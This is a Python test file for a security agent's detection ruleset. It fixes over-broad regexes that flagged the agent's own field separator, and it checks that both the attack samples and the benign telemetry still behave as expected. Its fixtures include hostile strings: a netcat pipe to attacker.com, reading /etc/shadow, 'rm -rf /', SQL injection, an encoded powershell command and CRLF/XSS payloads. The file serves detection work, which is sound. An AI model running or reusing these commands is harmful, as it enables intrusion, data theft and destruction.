"""Guards on the agent's detection rules.

A sample of 100 real events had 89 flagged CRITICAL / COMMAND INJECTION by a
single regex, `\\|(?:\\s*|)(\\w+)`, which matches a pipe followed by any word.
log_extractor joins Windows event fields with " | ", so the agent was matching
its own field separator. Three other patterns were nearly as broad: bare `\\r`
and `\\n` as CRLF injection, `\\.exe$` as file upload, and `\\b\\d{9}\\b` as PII.

Narrowing detection rules trades noise for the risk of missing something, so
both directions are pinned: the attacks that must still be caught, and the
routine telemetry that must stay quiet. Loosening the ruleset to silence noise
is only safe if the first list keeps passing.
"""
from __future__ import annotations

import pathlib
import re

import pytest
import yaml

RULES = pathlib.Path(__file__).resolve().parent.parent / "Sentora" / "conf" / "rules.yaml"


def _load():
    cfg = yaml.safe_load(RULES.read_text(encoding="utf-8")) or {}
    flags = 0
    for name in cfg.get("flags") or []:
        flags |= getattr(re, str(name).upper(), 0)
    rules, broken = [], []
    for category, spec in (cfg.get("categories") or {}).items():
        for line in ((spec or {}).get("patterns") or "").splitlines():
            pat = line.strip()
            if not pat or pat.startswith("#"):
                continue
            try:
                rules.append((category, pat, re.compile(pat, flags)))
            except re.error as e:
                broken.append((category, pat, str(e)))
    return rules, broken


RULESET, BROKEN = _load()


def matches(text: str):
    return [(c, p) for c, p, rx in RULESET if rx.search(text)]


# --------------------------------------------------------------------------
# Attacks that must still be detected
# --------------------------------------------------------------------------

@pytest.mark.parametrize("label,text", [
    ("pipe to whoami",     "cmd.exe /c dir | whoami"),
    ("pipe to netcat",     "ping 8.8.8.8 | nc attacker.com 4444"),
    ("pipe to base64",     "cat /etc/shadow | base64"),
    ("pipe to powershell", "echo x | powershell -enc SQBFAFgA"),
    ("encoded CRLF",       "/redir?url=%0d%0aSet-Cookie:%20admin=1"),
    ("header splitting",   "x=1%0d%0a%0d%0a<script>alert(1)</script>"),
    ("exe upload",         'Content-Disposition: form-data; filename="payload.exe"'),
    ("php upload",         "uploaded shell.php"),
    ("formatted SSN",      "ssn=123-45-6789"),
    ("rm -rf",             "; rm -rf /"),
    ("sql union",          "id=1' UNION SELECT NULL,NULL--"),
])
def test_real_attacks_are_still_caught(label, text):
    """The cost side of narrowing the rules. If any of these stop matching,
    the noise reduction went too far."""
    assert matches(text), f"{label} is no longer detected by any rule"


# --------------------------------------------------------------------------
# Routine telemetry that must stay quiet
# --------------------------------------------------------------------------

@pytest.mark.parametrize("label,text", [
    ("agent field separator",
     "[Software Protection Platform Service] EID=16384, Cat=0 | "
     "2126-07-29T16:05:55Z | RulesEngine"),
    ("shadow copy record",
     "[VSS] EID=8231, Cat=0 | taskhostw.exe | svchost.exe | services.exe"),
    ("multi-line log body", "line one\r\nline two\r\nline three"),
    ("windows binary path", "process: C:\\Windows\\System32\\svchost.exe"),
    ("nine digit counter", "bytes transferred: 123456789"),
    ("DCOM permission notice", "[DCOM] EID=10016, Cat=0 | Local | Activation"),
])
def test_routine_telemetry_does_not_fire(label, text):
    """These are the exact shapes that made up 89% of a real sample. Each one
    was previously stamped CRITICAL."""
    hits = matches(text)
    assert not hits, f"{label} still matches {hits[0][0]}: {hits[0][1]!r}"


# --------------------------------------------------------------------------
# The ruleset itself
# --------------------------------------------------------------------------

def test_every_pattern_compiles():
    """A pattern that will not compile is a category that can never fire, and
    nothing at runtime reports it - the agent skips it silently."""
    assert not BROKEN, f"{len(BROKEN)} uncompilable pattern(s): {BROKEN[:3]}"


def test_the_field_separator_rule_is_gone():
    """Pinned by exact text. This one regex accounted for 89 of 100 events in
    a real sample, so a re-introduction should fail loudly rather than be
    noticed months later."""
    assert not any(p == r"\|(?:\s*|)(\w+)" for _, p, _ in RULESET)


@pytest.mark.parametrize("pattern", [r"\r\n", r"\r", r"\n", r"\r\n\r\n", r"\n\n", r"\r\r"])
def test_bare_line_breaks_are_not_rules(pattern):
    """A blank line is not an attack."""
    assert not any(p == pattern for _, p, _ in RULESET)
